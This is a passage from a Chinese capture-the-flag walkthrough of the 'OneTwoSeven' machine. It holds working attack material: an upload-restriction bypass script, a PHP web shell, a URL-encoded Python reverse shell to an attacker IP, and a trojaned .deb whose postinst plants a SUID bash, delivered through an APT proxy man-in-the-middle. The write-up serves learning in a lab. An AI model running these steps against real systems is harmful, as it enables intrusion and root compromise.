真正处理上传、下载的文件都是 `ots-man-addon.php`，那么有没有可能，我们通过“下载的入口”使得后端的处理采用的是“上传”的逻辑呢？

答案是可行的。我们可以构造出这样的 URL：

```
http://127.0.0.1:60080/addon-download.php/addon-upload.php
```

重写规则要求，开头为 `addon-download.php`，符合。去访问 `ots-man-addon.php`。

switch case 的处理逻辑是从上到下，明显：

```
/\/addon-upload.php/
```

这样的正则表达式，匹配我们的 URL。

将之前本地的 shell.php 通过上述方法上传。这里有两种方法，第一种是直接通过浏览器开发者工具修改前端代码，将目标 URL 改一下，顺带将按钮恢复：

```bash
<form action="addon-download.php/addon-upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="addon" />
  <input type="submit"/><sup><font size="-2" color="red"> Disabled for security reasons.</font></sup>
</form>
```

接着正常选择文件上传即可。

当然，也可以自己写一个 Python 脚本用于处理该逻辑：

```python
import requests

url = 'http://127.0.0.1:60080/addon-download.php/addon-upload.php'

with open('shell.php', 'r') as f:
    files = {
        'addon' : ('shell.php', f, "text/plain")
    }
    res = requests.post(url=url, files=files, cookies={"PHPSESSID":"9p96mvdod45jv7n113kkpmhlg5"})

print(res.status_code)
print(res.text)
```

执行：

```bash
$ python upload.py
200
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>OneTwoSeven - Administation</title>

    <!-- Bootstrap core CSS -->
    <link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">

    <style>
      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
    </style>
    <!-- Custom styles for this template -->
    <link href="carousel.css" rel="stylesheet">
  </head>
  <body>
    <header>
  <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    <a class="navbar-brand" href="/menu.php">OneTwoSeven - Administration</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse w-100 order-2" id="navbarCollapse">
      <ul class="navbar-nav ml-auto">
        <li class="nav-item"><a class="nav-link" href="/logout.php">Logout</a></li>
      </ul>
    </div>
  </nav>
</header>

<main role="main">

  <!-- Marketing messaging and featurettes
  ================================================== -->
  <!-- Wrap the rest of the page in another container to center all the content. -->

  <div class="container marketing">

    <!-- START THE FEATURETTES -->
    <br><br><br>

    <div class="row featurette">
      <div class="col-md-3">
<p class="lead"><a href="?addon=addons/ots-default-user.php">OTS Default User
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-default-user.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-fs-backup.php">OTS File Backup
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-fs-backup.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-fs.php">OTS File Systems
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-fs.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-man-addon.php">OTS Addon Manager
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-man-addon.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-sysupdate.php">OTS System Upgrade
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-sysupdate.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-sysusers.php">OTS System Users
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-sysusers.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-top.php">OTS Top Output
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-top.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-uptime.php">OTS Uptime
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-uptime.php>[DL]</a></font></sup></p><p class="lead"><a href="?addon=addons/ots-users.php">OTS Users
</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=ots-users.php>[DL]</a></font></sup></p>      </div>
      <div class="col-md-9">
        <pre>


        </pre>
      </div>
    </div>

    <div class="row featurette">
      <div class="col-md-12">
        <h2 class="featurette-heading">Plugin Upload.<span class="text-muted"> Admins Only!</span></h2>
        <p class="lead">Upload new plugins to include on this status page using the upload form below.</p>
        <form action="addon-upload.php" method="POST" enctype="multipart/form-data">
          <input type="file" name="addon" />
          <input type="submit" disabled="disabled" /><sup><font size="-2" color="red"> Disabled for security reasons.</font></sup>
        </form>
      </div>
    </div>

    <hr class="featurette-divider">


  </div><!-- /.container -->

  <!-- FOOTER -->
  <footer class="container">
    <p class="float-right"><a href="#">Back to top</a></p>
    <p>&copy; 2019 OneTwoSeven, Dec. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
  </footer>
</main>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
      <script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script></body>
</html>
```

似乎成功了，直接返回了 menu 界面，尝试包含木马文件，并执行代码：

![[file-20260609164709427.png]]

依旧是：

```
Unknown plugin type.
```

此时可以通过之前的下载命令尝试下载上传的文件：

```bash
$ curl http://127.0.0.1:60080/addon-download.php -H 'Cookie: PHPSESSID=9p96mvdod45jv7n113kkpmhlg5' -G -d 'addon=shell.php' -o test.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    35  100    35    0     0     44      0 --:--:-- --:--:-- --:--:--    44
```

能下，说明文件确实上传成功了，目录也没写错，但是似乎 `menu.php` 对包含的文件有着某种限制。

### 3、symlink

能否通过某种方式看到 `menu.php` 的源码呢？

依旧是“作者仅交付了 MVP，并没有真正的实现 `chroot`”，尝试 `symlink` 能否软链接文件。

用新的账号（拿 User Flag 的那个），登入 SFTP，并实行软链接：

```bash
$ sftp ots-yODc2NGQ@10.129.12.43
ots-yODc2NGQ@10.129.12.43's password:
Connected to 10.129.12.43.
sftp> symlink /var/www/admin_html/menu.php /public_html/menu.txt
```

访问：

![[file-20260609165948000.png]]

成功看到 `menu.php` 的源码：

```php
<?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?>
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); } ?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>OneTwoSeven - Administation</title>

    <!-- Bootstrap core CSS -->
    <link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">

    <style>
      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
    </style>
    <!-- Custom styles for this template -->
    <link href="carousel.css" rel="stylesheet">
  </head>
  <body>
    <header>
  <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    <a class="navbar-brand" href="/menu.php">OneTwoSeven - Administration</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse w-100 order-2" id="navbarCollapse">
      <ul class="navbar-nav ml-auto">
        <li class="nav-item"><a class="nav-link" href="/logout.php">Logout</a></li>
      </ul>
    </div>
  </nav>
</header>

<main role="main">

  <!-- Marketing messaging and featurettes
  ================================================== -->
  <!-- Wrap the rest of the page in another container to center all the content. -->

  <div class="container marketing">

    <!-- START THE FEATURETTES -->
    <br><br><br>

    <div class="row featurette">
      <div class="col-md-3">
<?php
foreach (glob("addons/ots-*.php") as $fn) {
	$addon_file = basename($fn);
	$addon_type = rtrim(file($fn)[1]);
	$addon_name = substr(file($fn)[2],2);
	echo '<p class="lead"><a href="?addon=',$fn,'">',$addon_name,'</a>&nbsp;<sup><font size="-2"><a href=/addon-download.php?addon=',$addon_file,'>[DL]</a></font></sup></p>';
}
?>
      </div>
      <div class="col-md-9">
        <pre>

<?php 
set_time_limit(2);
if (isset($_GET['addon'])) {
	$addon_file = basename($_GET['addon']);
	$addon_type = rtrim(file("addons/".$addon_file)[1]);
	if ( $addon_type == '# OneTwoSeven Admin Plugin' ) {
		require_once("addons/".$addon_file);
	} else {
		echo "Unknown plugin type.";
	}
}
?>

	</pre>
      </div>
    </div>

    <div class="row featurette">
      <div class="col-md-12">
        <h2 class="featurette-heading">Plugin Upload.<span class="text-muted"> Admins Only!</span></h2>
        <p class="lead">Upload new plugins to include on this status page using the upload form below.</p>
        <form action="addon-upload.php" method="POST" enctype="multipart/form-data">
          <input type="file" name="addon" />
          <input type="submit" disabled="disabled" /><sup><font size="-2" color="red"> Disabled for security reasons.</font></sup>
        </form>
      </div>
    </div>

    <hr class="featurette-divider">


  </div><!-- /.container -->

  <!-- FOOTER -->
  <footer class="container">
    <p class="float-right"><a href="#">Back to top</a></p>
    <p>&copy; 2019 OneTwoSeven, Dec. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
  </footer>
</main>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
      <script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script></body>
</html>
```

直接去查找之前看到的报错信息，就可以看到：

```php
if (isset($_GET['addon'])) {
	$addon_file = basename($_GET['addon']);
	$addon_type = rtrim(file("addons/".$addon_file)[1]);
	if ( $addon_type == '# OneTwoSeven Admin Plugin' ) {
		require_once("addons/".$addon_file);
	} else {
		echo "Unknown plugin type.";
	}
}
```

首先简单做了“防目录穿越”，接着将整个文件按行切分成一个数组，取数组中的第二个元素与：

```
# OneTwoSeven Admin Plugin
```

进行比较，相等后才会执行“文件包含”操作。换言之，就是文件中的第二行需要含这段话，否则就会报：

```
Unknown plugin type.
```

显然，我们上传的文件没有，修改 `shell.php`：

```php
<?php
# OneTwoSeven Admin Plugin
system($_REQUEST['bash']);
?>
```

顺带换一个名字：

```
$ mv shell.php shell2.php
```

再次老方法上传，并且尝试命令执行：

![[file-20260609172108156.png]]

命令执行成功！

### 4、反弹 Shell

本地监听 4444 端口：

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

确认目标有 Python之后，我打算用 Python 实现反弹 Shell（下述代码经过 URL 编码）：

```
export%20RHOST%3D%2210.10.16.127%22%3Bexport%20RPORT%3D4444%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22bash%22%29%27
```

> 大家可以去 `https://www.revshells.com/` 这个网站上生成 Reverse Shell Code。

成功后，我们就获得了 www-data 的 shell：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ whoami
whoami
www-admin-data
```

反弹 Shell 代码中已经做了 pty（伪终端操作），我们加强一下。

ctrl + z 回到攻击机，并且输入：

```
www-admin-data@onetwoseven:/var/www/html-admin$ ^Z
[1]+  已停止               nc -lvnp 4444
$ stty raw -echo; fg
```

接着在 www-data shell 中设置环境变量：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ export TERM=xterm
```

如此一来，Shell 稳定化就完成了。

## 五、Root Flag

### 1、信息搜集

查看当前用户有哪些 sudo 权限：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

该用户可以不用输入密码，以任何用户、任何组身份运行下述两条命令：

```bash
/usr/bin/apt-get update
/usr/bin/apt-get upgrade
```

并且，在使用 `sudo` 权限执行命令的时候，可以保留：

```
ftp_proxy
http_proxy
https_proxy
no_proxy
```

这四个环境变量。

关于 `apt-get update`，在 `https://gtfobins.org/gtfobins/apt-get/#shell` 有现成的提权命令：

```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

但是这条命令有个额外的 `-o` 参数，这不匹配当前用户的 sudo 权限的范围。

回看：

```
(ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

在 sudoers 手册中可以找到下面这段话：

```
If a Cmnd has associated command line arguments, the arguments in the Cmnd must match those given by the user on the command line.
```

> 攻击机上输入：`man sudoers`，然后输入 `/<搜索内容>` 搜索对应内容即可看到。

简单来说就是，如果你给一个命令（Cmnd）指定了参数，那么用户在用 `sudo` 执行该命令的时候，参数必须和 sudoers 里面写的一致。

`update`、`upgrade` 是 `apt-get` 的参数，因此，我们只能使用：

```
/usr/bin/apt-get update
/usr/bin/apt-get upgrade
```

不能再带上其他的参数了。

但这绝对是一个突破口，查看 `/etc/apt/` 目录，里面的 `sources.list` 文件以及 `sources.list.d` 目录决定了 APT 去哪下载索引以及包。

```bash
www-admin-data@onetwoseven:/etc/apt$ cat sources.list
#

# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

#deb http://de.deb.devuan.org/merged ascii main
# deb-src http://de.deb.devuan.org/merged ascii main

#deb http://de.deb.devuan.org/merged ascii-security main
# deb-src http://de.deb.devuan.org/merged ascii-security main

#deb http://de.deb.devuan.org/merged ascii-updates main
# deb-src http://de.deb.devuan.org/merged ascii-updates main
```

主仓库列表中的信息全都被注释，这是怪现象，继续查看 `sources.list.d` 目录：

```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ ls
devuan.list  onetwoseven.list
```

有一个以题目名字命名的文件，查看：

```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat onetwoseven.list
# OneTwoSeven special packages - not yet in use
deb [trusted=yes] http://packages.onetwoseven.htb/devuan ascii main
```

`[trusted=yes]` 这代表不验证目标仓库的签名，而且当我们空执行 `sudo /usr/bin/apt-get update` 的时候：

```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ sudo /usr/bin/apt-get update
Err:1 http://packages.onetwoseven.htb/devuan ascii InReleaser/bin/apt-get update
  Temporary failure resolving 'packages.onetwoseven.htb'
Reading package lists... Done
W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'
W: Some index files failed to download. They have been ignored, or old ones used instead.
```

本地居然无法解析这个域名。

### 2、APT MITM Package Injection

#### （1）背景以及原理介绍

首先，了解一下 APT 拉取、更新/下载包的过程。整体分成两个阶段：

1. `apt update`
2. `apt upgrade`/`install`

第一阶段，当你运行 `apt update` 的时候，`apt` 会对 `sources.list` 中（以及 `sources.list.d` 目录中的 `.list` 文件）的每个源都进行下述操作：

1. 抓取 InRelease 或者 Release + Release.gpg：Release 包含整个仓库的元数据，Release.gpg 是对 Release 的独立签名。而 InRelease 本质上就是将元数据和 GPG 签名打包在同一个文件里面。
2. 验证签名：`apt` 通过本地受信任的公钥对签名进行验证，若不通过，则 `apt` 并不会信任该源。
3. 根据 Release / InRelease 抓取仓库中的包索引 Packages（通常先拉去其压缩文件版，若找不到压缩版则再拉去未压缩的）

上述提到了两个关键的文件 Release 和 Packages。

先讲 Release 文件，该文件中存放着描述该仓库的元数据，包括身份描述、范围声明、哈希清单（最关键），在哈希清单中，会列举出该仓库中每个索引文件的哈希值、字节大小、相对路径。

Packages 就是仓库中包（`.deb`）的索引文件，常会配备一个其压缩版本（`.gz`、`.xz` 等）。其内容记录了包的相关元数据，比如版本、架构、相对路径、Hash 等等。

简单来说，可以把 Release 看作是仓库的索引，Packages 看作是包的索引。

接下来第二个步骤，`apt upgrade / install`。这一步才是真正去拉去包的一步，根据刚刚的两个索引，立马可以定位到包在哪个仓库以及仓库中的哪个位置。

下载到本地后，进行包校验，校验 Hash 值是否和索引上看到的一样，不一样则不信任。

最后，由 `dpkg` 进行安装。

为了方便大家的理解，我这具一个例子（不知道形不形象）：一个老板有很多的个人仓库（`sources.list`），每个仓库都配有一个仓库管理员（`Release`），而且由于仓库巨大，仓库的每个分区都有对应的员工（`Packages`）。有一天，老板想要找一个具体的东西，但是不知道放在哪里了，就一个个地把仓库管理员叫过来问情况（拉取 `Release`）。仓库管理员就把员工找过来询问（拉取 `Packages`），员工最熟悉自己的分区了（`Packages` 里面有包的相关元数据），最终拿到了物品交给了老板（获得 `.deb`）。

还有一个关键的背景知识：`.deb` 包的组成。

`.deb` 主要有两个部分组成：

- 数据部分
- 控制部分

数据部分就是该 Debian 软件包的实际载荷。简单说，后续的使用该软件所需要的内容。

控制部分是软件包在安装/卸载的时候需要查看、执行的部分，后续软件使用用不到这些。

有了上述背景知识，就可以很轻松地理解 APT MITM Package Injection（APT 中间人软件包注入）了。

根据对 APT 拉取 `.deb` 的理解，如果我们能控制服务器仓库源，将源配置成我们自己搭建的恶意仓库，那么服务器在执行 `update` 操作的时候，就会去恶意仓库中拉取 Release 和 Packages（当然这两个文件是受我们控制的），最后在 `upgrade` 或 `install` 的时候就会拉取恶意的 `.deb`。

恶意的 `.deb` 的控制部分被我们修改，在 `dpkg` 一安装的时候，就会执行恶意的代码。

本靶机刚好符合：

1. `apt update`、`apt upgrade` 操作都需要 root 权限，本题刚好有 sudo 权限
2. 允许代理保留：将代理配置成我们的攻击机上运行的恶意代理（作为恶意仓库），那么拉取的 Release、Packages 以及 `.deb` 都受到我们的控制
3. `[trusted=yes]`：不验证仓库的签名，即只需要 Release 不需要 Release.gpg

#### （2）施展攻击

选择一个攻击的目标，我这挑选的是 telnet：

```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ dpkg -l | grep telnet
ii  telnet                                 0.17-41                            amd64        basic telnet client
```

查看该包的信息：

```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ apt-cache show telnet
Package: telnet
Status: install ok installed
Priority: standard
Section: net
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Source: netkit-telnet
Version: 0.17-41
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
 The telnet command is used for interactive communication with another host
 using the TELNET protocol.
 .
 For the purpose of remote login, the present client executable should be
 depreciated in favour of an ssh-client, or in some cases with variants like
 telnet-ssl or Kerberized TELNET clients.  The most important reason is that
 this implementation exchanges user name and password in clear text.
 .
 On the other hand, the present program does satisfy common use cases of
 network diagnostics, like protocol testing of SMTP services, so it can
 become handy enough.
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
```

在官方上，下载同一版本的 `.deb` 到本地进行改造：

```bash
$ wget https://archive.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
--2026-06-09 21:35:00--  https://archive.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
正在解析主机 archive.debian.org (archive.debian.org)... 198.18.0.172
正在连接 archive.debian.org (archive.debian.org)|198.18.0.172|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：72008 (70K) [application/vnd.debian.binary-package]
正在保存至: “telnet_0.17-41_amd64.deb”

telnet_0.17-41_amd64.deb             100%[===================================================================>]  70.32K   218KB/s  用时 0.3s

2026-06-09 21:35:02 (218 KB/s) - 已保存 “telnet_0.17-41_amd64.deb” [72008/72008])

$ file telnet_0.17-41_amd64.deb
telnet_0.17-41_amd64.deb: Debian binary package (format 2.0), with control.tar.gz , data compression xz
```

解包到指定目录：

```bash
$ dpkg-deb -R telnet_0.17-41_amd64.deb malicious/
$ cd malicious/
$ ls
DEBIAN  usr
```

注意不要用 `-x` 参数进行解包：

```
-x 将所有文件解压。
-R 解压控制信息和控制文件。
```

`-x` 只能解压出数据部分而不能解压出控制部分。

我们要修改的部分是控制部分（`DEBIAN`），进入目录，可以看到里面有文件：

```bash
$ ls
control  md5sums  postinst  postrm  prerm
```

其中 `control` 文件中有版本信息，这是让目标更新拉取的关键，只有出现比现版本高的包的时候才会进行重新拉取。

其中，`control` 文件中有该软件包的核心元数据，包含版本号、架构、依赖等等。我们需要修改其中的版本号，将版本往上提几个，这样才能让目标更新、拉取。

`0.17-41` $\to$ `0.17-42`：

```bash
$ cat control | rg Version
Version: 0.17-42
```

除此之外，还需要修改 `postinst` 文件，这个文件是可执行脚本，软件包在被 `dpkg` 安装的时候，会执行这个文件。我们可以在其中添加恶意命令。

在末尾添加：

```bash
$ tail -n 2 postinst
cp /bin/bash /tmp/pwn
chmod 4755 /tmp/pwn
```

这两条命令将 `/bin/bash` 复制成 `/tmp/pwn`，并设置 SUID 位和可执行权限。到时候恶意 `.deb` 下载完成的时候，就可以通过 `/tmp/pwn` 进行提权。

恶意包的内容已经修改完成，将其重新打包：

```bash
$ dpkg-deb -b malicious/ telnet_0.17-42_amd64.deb
dpkg-deb: 警告: root directory malicious/ has unusual owner or group 1000:1005
dpkg-deb: hint: you might need to pass --root-owner-group, see <https://wiki.debian.org/Teams/Dpkg/RootlessBuilds> for further details
dpkg-deb: 警告: 忽略有关 control 文件的 1 个警告
dpkg-deb: 正在 'telnet_0.17-42_amd64.deb' 中构建软件包 'telnet'。
```

虽然出现了很多的警告，但是不影响文件的生成：

```bash
$ file telnet_0.17-42_amd64.deb
telnet_0.17-42_amd64.deb: Debian binary package (format 2.0), with control.tar.xz , data compression xz
```

接下来开始构建恶意代理服务器，创建一个目录，先将恶意软件包放进去：

```bash
$ mkdir proxy
$ mv telnet_0.17-42_amd64.deb proxy/
$ cd proxy/
```

拉取 Release 和 Packages 有目录上的要求，我们可以启动一个简易的 Web 服务器，来看看目录情况：

```bash
$ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

在目标上配置 `http_proxy`：

```bash
www-adminww-admin-data@onetwoseven:/var/www/html-admin$ export 'http_proxy=10.10.16.104:8888'
www-admin-data@onetwoseven:/var/www/html-admin$ echo $http_proxy
http://10.10.16.104:8888
```

执行 `update` 后，观察 Web 服务器的日志信息，就可以推算出目录：

```bash
$ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.12.83 - - [10/Jun/2026 11:10:33] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:33] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:34] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:34] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/Release HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:34] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:34] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:35] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:35] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages.xz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:36] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:36] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en.xz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:37] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:37] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.bz2 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:37] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:37] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages.bz2 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:38] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:38] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en.bz2 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:38] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:38] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.lzma HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:39] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:39] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages.lzma HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:40] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:40] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en.lzma HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:41] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:41] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:42] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:42] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:43] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:43] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages.gz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:45] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:45] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en.gz HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:45] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:45] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.lz4 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:46] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:46] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages.lz4 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:47] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:47] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en.lz4 HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:47] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:47] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:48] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:48] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-all/Packages HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 11:10:49] code 404, message File not found
10.129.12.83 - - [10/Jun/2026 11:10:49] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/i18n/Translation-en HTTP/1.1" 404 -
```

将上述信息放到一个文件中（我放在了 `rz` 文件中），然后提取目录信息：

```bash
$ cat rz | rg -o 'http://packages.onetwoseven.htb/[a-zA-Z0-9\/\-_\.]*' | sed 's/http:\/\/packages.onetwoseven.htb//'
/devuan/dists/ascii/InRelease
/devuan/dists/ascii/Release
/devuan/dists/ascii/main/binary-amd64/Packages.xz
/devuan/dists/ascii/main/binary-all/Packages.xz
/devuan/dists/ascii/main/i18n/Translation-en.xz
/devuan/dists/ascii/main/binary-amd64/Packages.bz2
/devuan/dists/ascii/main/binary-all/Packages.bz2
/devuan/dists/ascii/main/i18n/Translation-en.bz2
/devuan/dists/ascii/main/binary-amd64/Packages.lzma
/devuan/dists/ascii/main/binary-all/Packages.lzma
/devuan/dists/ascii/main/i18n/Translation-en.lzma
/devuan/dists/ascii/main/binary-amd64/Packages.gz
/devuan/dists/ascii/main/binary-amd64/Packages.gz
/devuan/dists/ascii/main/binary-all/Packages.gz
/devuan/dists/ascii/main/i18n/Translation-en.gz
/devuan/dists/ascii/main/binary-amd64/Packages.lz4
/devuan/dists/ascii/main/binary-all/Packages.lz4
/devuan/dists/ascii/main/i18n/Translation-en.lz4
